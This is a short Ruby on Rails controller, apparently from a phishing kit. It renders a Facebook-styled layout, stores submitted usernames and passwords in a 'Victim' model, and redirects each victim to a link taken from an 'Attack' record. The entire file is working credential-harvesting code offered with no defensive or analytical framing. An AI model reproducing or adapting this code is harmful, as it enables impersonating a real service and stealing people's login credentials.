class VictimsController < ApplicationController
	layout 'facebook'
	
	def mobile_device?
	   if session[:mobile_param]
	     session[:mobile_param] == "1"
	   else
	     request.user_agent =~ /Mobile|webOS/
	   end
	end
	def new 
		@V= Victim.new
		if mobile_device?
  			
	  	else
	  		@g="jj"
	  	end
	end

	def create
		@V=Victim.create(usu: params[:victim][:usu],con: params[:victim][:con],swusu: params[:victim][:swusu])
		cad =Attack.find( params[:victim][:link])
		redirect_to "#{cad.link}"
	end
end
